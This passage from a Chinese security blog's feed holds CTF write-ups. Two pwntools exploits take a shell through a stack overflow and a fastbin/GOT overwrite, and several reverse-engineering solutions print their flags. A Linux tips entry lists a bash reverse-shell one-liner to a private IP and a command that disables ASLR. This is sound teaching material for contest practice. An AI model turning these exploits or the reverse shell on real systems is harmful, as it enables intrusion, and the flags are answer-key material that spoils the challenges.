href="#接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system-“-bin-sh”-的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell" class="headerlink" title="接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system(“/bin/sh”)的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell"></a>接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system(“/bin/sh”)的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell</h3><h3 id="Exp如下："><a href="#Exp如下：" class="headerlink" title="Exp如下："></a>Exp如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./login")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">payload = "admin\x00"</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">payload = "2jctf_pa5sw0rd\x00"</span><br><span class="line">payload += "aaaabaaac\x00aadaaaeaaafaaagaaahayyyyyyyyyyyyyyyyyyyyyyyyyyy" + p64(0x400E9E)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-easyheap"><a href="#0x2-easyheap" class="headerlink" title="0x2 easyheap"></a>0x2 easyheap</h2><h3 id="堆题先检查保护"><a href="#堆题先检查保护" class="headerlink" title="堆题先检查保护"></a>堆题先检查保护</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pig@ubuntu:$ checksec easyheap </span><br><span class="line">[*] '/home/pig/Pig/CTF/ShengSai/19.9.21/pwn/easyheap/easyheap'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">`</span><br></pre></td></tr></tbody></table></figure></div><h3 id="没有开PIE-且-没有GOT保护，先想到覆盖free-GOT"><a href="#没有开PIE-且-没有GOT保护，先想到覆盖free-GOT" class="headerlink" title="没有开PIE 且 没有GOT保护，先想到覆盖free_GOT"></a>没有开PIE 且 没有GOT保护，先想到覆盖free_GOT</h3><h3 id="然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free-GOT为system-PLT，然后free一个内容为-bin-sh的堆块即可执行system-“-bin-sh-x00”"><a href="#然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free-GOT为system-PLT，然后free一个内容为-bin-sh的堆块即可执行system-“-bin-sh-x00”" class="headerlink" title="然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free_GOT为system_PLT，然后free一个内容为/bin/sh的堆块即可执行system(“/bin/sh\x00”)"></a>然后导入ida发现有明显的堆溢出，然后程序本身就存在system函数，所以直接覆盖free_GOT为system_PLT，然后free一个内容为/bin/sh的堆块即可执行system(“/bin/sh\x00”)</h3><h2 id="具体步骤如下"><a href="#具体步骤如下" class="headerlink" title="具体步骤如下"></a>具体步骤如下</h2><h3 id="申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin-attack攻击chunk-list，然后覆盖第一个堆块为free-GOT，然后通过edit功能修改free-GOT为system-PLT，同时第二个堆块的内容为-bin-sh-x00，free掉第二个堆块即可拿到shell"><a href="#申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin-attack攻击chunk-list，然后覆盖第一个堆块为free-GOT，然后通过edit功能修改free-GOT为system-PLT，同时第二个堆块的内容为-bin-sh-x00，free掉第二个堆块即可拿到shell" class="headerlink" title="申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin attack攻击chunk_list，然后覆盖第一个堆块为free_GOT，然后通过edit功能修改free_GOT为system_PLT，同时第二个堆块的内容为/bin/sh\x00，free掉第二个堆块即可拿到shell"></a>申请三个堆块，通过第二个堆块覆盖到第三个堆块实现fastbin attack攻击chunk_list，然后覆盖第一个堆块为free_GOT，然后通过edit功能修改free_GOT为system_PLT，同时第二个堆块的内容为/bin/sh\x00，free掉第二个堆块即可拿到shell</h3><h3 id="Exp如下：-1"><a href="#Exp如下：-1" class="headerlink" title="Exp如下："></a>Exp如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easyheap")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter("Your choice :","1")</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("Your choice :","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./easyheap")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">free(2)</span><br><span class="line">payload = '/bin/sh\x00'</span><br><span class="line">payload = payload.ljust(0x68,'a')</span><br><span class="line">payload += p64(0x71) + p64(0x6020ad)</span><br><span class="line">edit(1,0x200,payload)</span><br><span class="line">add(0x68,'')</span><br><span class="line">add(0x68,'')</span><br><span class="line">payload = '\xaa' * 3 + p64(0) * 4 + p64(elf.got['free'])</span><br><span class="line">edit(3,len(payload) + 0x100,payload)</span><br><span class="line">edit(0,9,p64(elf.plt['system']))</span><br><span class="line">free(1)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("127.0.0.1",9999,1)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;CTF-19年浙江省大学生网络安全大赛&quot;&gt;&lt;a href=&quot;#CTF-19年浙江省大学生网络安全大赛&quot; class=&quot;headerlink&quot; title=&quot;CTF-19年浙江省大学生网络安全大赛&quot;&gt;&lt;/a&gt;CTF-
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-KernelPwn-基础</title>
    <link href="http://yoursite.com/2019/09/15/CTF-KernelPwn-%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/09/15/CTF-KernelPwn-%E8%AF%A6%E8%A7%A3/</id>
    <published>2019-09-15T15:01:02.000Z</published>
    <updated>2019-12-30T12:40:36.026Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="bf9e4de1892addceb4e950773114d8770ab27df1827cf6ffb4d80c76d5b6246d"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      通过例题来讲述kernel pwn的流程
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTF-BUUCTF-Reverse刷题之旅-(1)</title>
    <link href="http://yoursite.com/2019/09/11/CTF-BUUCTF-Reverse%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
    <id>http://yoursite.com/2019/09/11/CTF-BUUCTF-Reverse%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</id>
    <published>2019-09-11T15:22:43.000Z</published>
    <updated>2019-09-28T14:24:28.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-xor"><a href="#0x01-xor" class="headerlink" title="0x01 xor"></a>0x01 xor</h2><h3 id="导入ida，发现是一个f-x-f-x-f-x-1-的加密方式，直接逆出来就好了，脚本如下"><a href="#导入ida，发现是一个f-x-f-x-f-x-1-的加密方式，直接逆出来就好了，脚本如下" class="headerlink" title="导入ida，发现是一个f(x) = f(x)^f(x-1)的加密方式，直接逆出来就好了，脚本如下"></a>导入ida，发现是一个f(x) = f(x)^f(x-1)的加密方式，直接逆出来就好了，脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">encode = 'f\nk\x0cw&O.@\x11x\x0dZ;U\x11p\x19F\x1Fv"M#D\x0Eg\x06h\x0FG20'</span><br><span class="line">flag = ''</span><br><span class="line">flag+='f'</span><br><span class="line">for i in range(1,len(encode)):</span><br><span class="line">flag += chr(ord(encode[i])^ord(encode[i-1]))</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-QianQiuWanDai-YiTongJiangHu"><a href="#flag-QianQiuWanDai-YiTongJiangHu" class="headerlink" title="flag{QianQiuWanDai_YiTongJiangHu}"></a>flag{QianQiuWanDai_YiTongJiangHu}</h3><h2 id="0x02-新年快乐"><a href="#0x02-新年快乐" class="headerlink" title="0x02 新年快乐"></a>0x02 新年快乐</h2><h3 id="程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag"><a href="#程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag" class="headerlink" title="程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag"></a>程序是UPX3加壳，脱壳后导入ida，看到一个字符串比较，就是flag</h3><h3 id="flag-HappyNewYear"><a href="#flag-HappyNewYear" class="headerlink" title="flag{HappyNewYear!}"></a>flag{HappyNewYear!}</h3><h2 id="0x03-reverse-2"><a href="#0x03-reverse-2" class="headerlink" title="0x03 reverse_2"></a>0x03 reverse_2</h2><h3 id="导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下"><a href="#导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下" class="headerlink" title="导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下"></a>导入ida中，发现flag字符串，然后在main里发现一个字符替换，替换方式如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag字符串为hacking_for_fun</span><br><span class="line">将i和r换成1，然后加上flag{}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-hack1ng-fo1-fun"><a href="#flag-hack1ng-fo1-fun" class="headerlink" title="flag{hack1ng_fo1_fun}"></a>flag{hack1ng_fo1_fun}</h3><h2 id="0x04-内涵的软件"><a href="#0x04-内涵的软件" class="headerlink" title="0x04 内涵的软件"></a>0x04 内涵的软件</h2><h3 id="导入ida直接看到flag"><a href="#导入ida直接看到flag" class="headerlink" title="导入ida直接看到flag"></a>导入ida直接看到flag</h3><h3 id="flag-49d3c93df25caad81232130f3d2ebfad"><a href="#flag-49d3c93df25caad81232130f3d2ebfad" class="headerlink" title="flag{49d3c93df25caad81232130f3d2ebfad}"></a>flag{49d3c93df25caad81232130f3d2ebfad}</h3><h2 id="0x05-reverse3"><a href="#0x05-reverse3" class="headerlink" title="0x05 reverse3"></a>0x05 reverse3</h2><h3 id="导入ida，发现加密后的字符串为"><a href="#导入ida，发现加密后的字符串为" class="headerlink" title="导入ida，发现加密后的字符串为"></a>导入ida，发现加密后的字符串为</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3nifIH9b_C@n@dH</span><br></pre></td></tr></tbody></table></figure></div><p>两次加密，先是base64加密，然后每一位字符加上自己位置的偏移</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">encode = "e3nifIH9b_C@n@dH"</span><br><span class="line">decode1 = ''</span><br><span class="line">flag = ''</span><br><span class="line">for i in range(0,len(encode)):</span><br><span class="line">decode1 += chr(ord(encode[i]) - i)</span><br><span class="line">print base64.b64decode(decode1)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-i-l0ve-you"><a href="#flag-i-l0ve-you" class="headerlink" title="flag{i_l0ve_you}"></a>flag{i_l0ve_you}</h3><h2 id="0x06-Java逆向解密"><a href="#0x06-Java逆向解密" class="headerlink" title="0x06 Java逆向解密"></a>0x06 Java逆向解密</h2><p>把class反编译一下，得到以下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import java.io.PrintStream;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Reverse</span><br><span class="line">{</span><br><span class="line">  public static void main(String[] args)</span><br><span class="line">  {</span><br><span class="line">    Scanner s = new Scanner(System.in);</span><br><span class="line">    System.out.println("Please input the flag :");</span><br><span class="line">    String str = s.next();</span><br><span class="line">    System.out.println("Your input is:");</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    char[] stringArr = str.toCharArray();</span><br><span class="line">    Encrypt(stringArr);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  public static void Encrypt(char[] arr)</span><br><span class="line">  {</span><br><span class="line">    ArrayList<integer> Resultlist = new ArrayList();</integer></span><br><span class="line">    for (int i = 0; i < arr.length; i++)</span><br><span class="line">    {</span><br><span class="line">      int result = arr[i] + '@' ^ 0x20;</span><br><span class="line">      Resultlist.add(Integer.valueOf(result));</span><br><span class="line">    }</span><br><span class="line">    int[] KEY = { 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 };</span><br><span class="line">    ArrayList<integer> KEYList = new ArrayList();</integer></span><br><span class="line">    for (int j = 0; j < KEY.length; j++) {</span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line">    }</span><br><span class="line">    System.out.println("Result:");</span><br><span class="line">    if (Resultlist.equals(KEYList)) {</span><br><span class="line">      System.out.println("Congratulations!");</span><br><span class="line">    } else {</span><br><span class="line">      System.err.println("Error!");</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>简单分析了就一下就可以写出解密算法</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encrypto = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]</span><br><span class="line">flag = ''</span><br><span class="line">for i in encrypto:</span><br><span class="line">flag += chr(i - ord('@')^0x20)</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-This-is-the-flag"><a href="#flag-This-is-the-flag" class="headerlink" title="flag{This_is_the_flag_!}"></a>flag{This_is_the_flag_!}</h3><h2 id="0x07-简单注册器"><a href="#0x07-简单注册器" class="headerlink" title="0x07 简单注册器"></a>0x07 简单注册器</h2><h3 id="导入jeb，搜索flag-找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下："><a href="#导入jeb，搜索flag-找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下：" class="headerlink" title="导入jeb，搜索flag{找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下："></a>导入jeb，搜索flag{找到关键代码，然后反编译为源码，然后直接复制粘贴出加密代码，然后直接还原，代码如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String args[]) {</span><br><span class="line">        int v11 = 31;</span><br><span class="line">        int v9 = 2;</span><br><span class="line">        int v2 = 1;</span><br><span class="line">        char[] v5 = "dd2940c04462b4dd7c450528835cca15".toCharArray();</span><br><span class="line">        v5[v9] = ((char)(v5[v9] + v5[3] - 50));</span><br><span class="line">        v5[4] = ((char)(v5[v9] + v5[5] - 48));</span><br><span class="line">        v5[30] = ((char)(v5[v11] + v5[9] - 48));</span><br><span class="line">        v5[14] = ((char)(v5[27] + v5[28] - 97));</span><br><span class="line">        int v4;</span><br><span class="line">        for(v4 = 0; v4 < 16; ++v4) {</span><br><span class="line">            char v0 = v5[31 - v4];</span><br><span class="line">            v5[31 - v4] = v5[v4];</span><br><span class="line">            v5[v4] = v0;</span><br><span class="line">        }</span><br><span class="line">        System.out.println(v5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="flag-59acc538825054c7de4b26440c0999dd"><a href="#flag-59acc538825054c7de4b26440c0999dd" class="headerlink" title="flag{59acc538825054c7de4b26440c0999dd}"></a>flag{59acc538825054c7de4b26440c0999dd}</h3></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;0x01-xor&quot;&gt;&lt;a href=&quot;#0x01-xor&quot; class=&quot;headerlink&quot; title=&quot;0x01 xor&quot;&gt;&lt;/a&gt;0x01 xor&lt;/h2&gt;&lt;h3 id=&quot;导入ida，发现是一个f-x-f
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Crypto" scheme="http://yoursite.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Linux-技巧</title>
    <link href="http://yoursite.com/2019/09/08/Linux-%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2019/09/08/Linux-%E6%8A%80%E5%B7%A7/</id>
    <published>2019-09-08T05:29:02.000Z</published>
    <updated>2019-11-10T14:45:08.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="Python相关"><a href="#Python相关" class="headerlink" title="Python相关"></a>Python相关</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install 库名     //指定某版本python安装库</span><br><span class="line">python -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 库名        //指定源进行pip安装</span><br></pre></td></tr></tbody></table></figure></div><h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></tbody></table></figure></div><h2 id="弹Shell"><a href="#弹Shell" class="headerlink" title="弹Shell"></a>弹Shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i >& /dev/tcp/192.168.174.128/9090 0>&1</span><br></pre></td></tr></tbody></table></figure></div><h2 id="apt-lock"><a href="#apt-lock" class="headerlink" title="apt lock"></a>apt lock</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></tbody></table></figure></div><h2 id="修改bash的颜色"><a href="#修改bash的颜色" class="headerlink" title="修改bash的颜色"></a>修改bash的颜色</h2><h3 id="以下文章摘录于-https-www-cnblogs-com-the-tops-p-5662563-html"><a href="#以下文章摘录于-https-www-cnblogs-com-the-tops-p-5662563-html" class="headerlink" title="以下文章摘录于 https://www.cnblogs.com/the-tops/p/5662563.html"></a>以下文章摘录于 <a href="https://www.cnblogs.com/the-tops/p/5662563.html" target="_blank" rel="noopener">https://www.cnblogs.com/the-tops/p/5662563.html</a></h3><h3 id="【侵删】"><a href="#【侵删】" class="headerlink" title="【侵删】"></a>【侵删】</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 